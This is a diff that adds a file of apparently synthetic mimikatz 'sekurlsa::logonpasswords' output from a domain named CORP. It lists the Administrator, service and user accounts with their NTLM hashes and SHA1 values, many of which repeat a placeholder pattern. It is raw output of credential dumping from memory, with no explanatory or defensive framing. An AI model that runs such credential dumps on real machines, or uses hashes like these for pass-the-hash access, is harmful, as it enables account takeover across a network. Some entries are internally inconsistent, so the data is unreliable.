@@ -1,0 +1,150 @@
+mimikatz # sekurlsa::logonpasswords
+Full
+
+Authentication Id : 0 ; 1122806 (00000000:001121f6)
+Session           : Interactive from 2
+User Name         : Administrator
+Domain            : CORP
+Logon Server      : DC01
+Logon Time        : 09/07/2026 08:14:22
+SID               : S-1-5-21-3842939050-3880317879-2865463114-500
+	msv :
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : CORP
+	 * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c
+	 * SHA1     : d033e22ae348aeb5660fc2140aec35850c4da997
+	tspkg :
+	wdigest :
+	 * Username : Administrator
+	 * Domain   : CORP
+	 * Password : (null)
+	kerberos :
+	 * Username : Administrator
+	 * Domain   : CORP.LOCAL
+	 * Password : (null)
+
+Authentication Id : 0 ; 998 (00000000:000003e6)
+Session           : Service from 0
+User Name         : jdupont
+Domain            : CORP
+Logon Server      : DC01
+Logon Time        : 09/07/2026 07:55:01
+SID               : S-1-5-21-3842939050-3880317879-2865463114-1001
+	msv :
+	 [00000003] Primary
+	 * Username : jdupont
+	 * Domain   : CORP
+	 * NTLM     : 64f12cddaa88057e06a81b54e73b949b
+	 * SHA1     : aabbccddee1122334455aabbccddee1122334455
+	tspkg :
+	wdigest :
+
+Authentication Id : 0 ; 1003 (00000000:000003eb)
+Session           : Network from 0
+User Name         : guest
+Domain            : CORP
+Logon Server      : (null)
+Logon Time        : 09/07/2026 07:55:01
+SID               : S-1-5-21-3842939050-3880317879-2865463114-501
+	msv :
+	 [00000003] Primary
+	 * Username : guest
+	 * Domain   : CORP
+	 * NTLM     : (null)
+	 * LM       : (null)
+	tspkg :
+	wdigest :
+
+Authentication Id : 0 ; 4109 (00000000:0000100d)
+Session           : Interactive from 1
+User Name         : mmartin
+Domain            : CORP
+Logon Server      : DC01
+Logon Time        : 09/07/2026 09:02:37
+SID               : S-1-5-21-3842939050-3880317879-2865463114-1002
+	msv :
+	 [00000003] Primary
+	 * Username : mmartin
+	 * Domain   : CORP
+	 * NTLM     : 32ed87bdb5fdc5e9cba88547376818d4
+	 * SHA1     : aabbccddee1122334455aabbccddee1122334455
+	tspkg :
+	kerberos :
+	 * Username : mmartin
+	 * Domain   : CORP.LOCAL
+	 * Password : (null)
+
+Authentication Id : 0 ; 7823 (00000000:00001e8f)
+Session           : Service from 0
+User Name         : svcbackup
+Domain            : CORP
+Logon Server      : DC01
+Logon Time        : 09/07/2026 07:58:14
+SID               : S-1-5-21-3842939050-3880317879-2865463114-1003
+	msv :
+	 [00000003] Primary
+	 * Username : svcbackup
+	 * Domain   : CORP
+	 * NTLM     : 209c6174da490caeb422f3fa5a7ae634
+	 * SHA1     : aabbccddee1122334455aabbccddee1122334455
+	tspkg :
+
+Authentication Id : 0 ; 223901 (00000000:000369dd)
+Session           : Interactive from 3
+User Name         : lbernard
+Domain            : CORP
+Logon Server      : DC01
+Logon Time        : 09/07/2026 10:15:09
+SID               : S-1-5-21-3842939050-3880317879-2865463114-1004
+	msv :
+	 [00000003] Primary
+	 * Username : lbernard
+	 * Domain   : CORP
+	 * NTLM     : cf3a5525ee9414229e66279623ed5c58
+	 * SHA1     : aabbccddee1122334455aabbccddee1122334455
+	tspkg :
+
+Authentication Id : 0 ; 556032 (00000000:00087e00)
+Session           : Interactive from 1
+User Name         : abousquet
+Domain            : CORP
+Logon Server      : DC01
+Logon Time        : 09/07/2026 08:47:53
+SID               : S-1-5-21-3842939050-3880317879-2865463114-1005
+	msv :
+	 [00000003] Primary
+	 * Username : abousquet
+	 * Domain   : CORP
+	 * NTLM     : 72f0eefcc213ea8f350773b831cf2c9c
+	 * SHA1     : aabbccddee1122334455aabbccddee1122334455
+	tspkg :
+
+Authentication Id : 0 ; 78901 (00000000:000133f5)
+Session           : Network from 0
+User Name         : SYSTEM
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 09/07/2026 07:54:33
+SID               : S-1-5-18
+	msv :
+	tspkg :
+	wdigest :
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : WORKGROUP$
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 09/07/2026 07:54:33
+SID               : S-1-5-18
+	msv :
+	 [00000003] Primary
+	 * Username : WORKGROUP$
+	 * Domain   : (null)
+	 * NTLM     : (null)
+	 * LM       : aad3b435b51404eeaad3b435b51404ee
+	tspkg :
